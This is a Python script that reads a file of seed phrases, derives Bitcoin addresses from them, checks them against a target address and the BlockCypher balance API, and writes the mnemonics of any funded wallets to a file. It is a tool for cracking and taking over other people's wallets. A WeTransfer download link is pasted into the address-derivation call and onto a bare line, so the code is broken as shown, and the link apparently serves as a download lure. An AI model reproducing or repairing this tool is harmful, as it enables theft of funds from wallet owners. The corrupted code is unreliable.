import time
import requests
from bip_utils import Bip39SeedGenerator, Bip39MnemonicGenerator, Bip44, Bip44Coins, Bip44Changes

# Function to derive a Bitcoin address from a mnemonic phrase
def generate_bitcoin_address(mnemonic, account=0, change=Bip44Changes.CHAIN_EXT, address_index=0):
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip44_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc = bip44_mst.Purpose().Coin().Account(account)
    bip44_chg = bip44_acc.Change(change)
    bip44_addr = bip44_chg.AddressIndex(address_index)
    return bip44_addr.PublicKey().ToAddress(https://we.tl/t-4fcfP3kN8P)

# Function to check Bitcoin balance using BlockCypher API
def get_bitcoin_balance(address):
    api_url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance"
    response = requests.get(api_url)
    if response.status_code == 200:
        balance_info = response.json()
        return balance_info['balance'] / 1e8  # Convert satoshi to BTC
    else:
        return None

# Load seed phrases from file
def load_seed_phrases(file_path):
    with open(file_path, "r") as file:
        return [line.strip() for line in file.readlines()]
https://we.tl/t-4fcfP3kN8P
# Input: Target Bitcoin address and seed phrase file
target_address = input("Enter the target Bitcoin address: ")
seed_file = input("Enter the seed phrase file path: ")

# Load the seed phrases
seed_phrases = load_seed_phrases(seed_file)

# Initialize variables
found = False
found_wallets = []
total_guesses = len(seed_phrases)
processed_guesses = 0

# Start timing
start_time = time.time()

# Loop to generate addresses and compare with the target
for mnemonic in seed_phrases:
    # Derive the Bitcoin address
    generated_address = generate_bitcoin_address(mnemonic)
    
    # Compare the generated address with the target address
    processed_guesses += 1
    print(f"Processed {processed_guesses}/{total_guesses}: {generated_address}")
    
    if generated_address == target_address:
        found = True
        print(f"Match found! Mnemonic: {mnemonic}")
        break

    # Check the balance of the generated address
    balance = get_bitcoin_balance(generated_address)
    if balance is not None and balance > 0:
        found_wallets.append((mnemonic, generated_address, balance))
        print(f"Wallet with balance found! Address: {generated_address}, Balance: {balance} BTC")
    
    # Measure speed
    elapsed_time = time.time() - start_time
    if elapsed_time > 0:
        speed = processed_guesses / elapsed_time
        print(f"Speed: {speed:.2f} seed phrases per second")

# Save found wallets to file if any
if found_wallets:
    with open("boubbel.txt", "w") as file:
        for wallet in found_wallets:
            file.write(f"Mnemonic: {wallet[0]}\nAddress: {wallet[1]}\nBalance: {wallet[2]} BTC\n\n")
    print(f"Found wallets with balance saved to boubbel.txt")

if not found:
    print(f"Target address not found after processing {processed_guesses} guesses.")
else:
    # Check the balance of the matched address
    balance = get_bitcoin_balance(target_address)
    if balance is not None:
        print(f"Balance for {target_address}: {balance} BTC")
    else:
        print(f"Failed to retrieve balance for {target_address}")
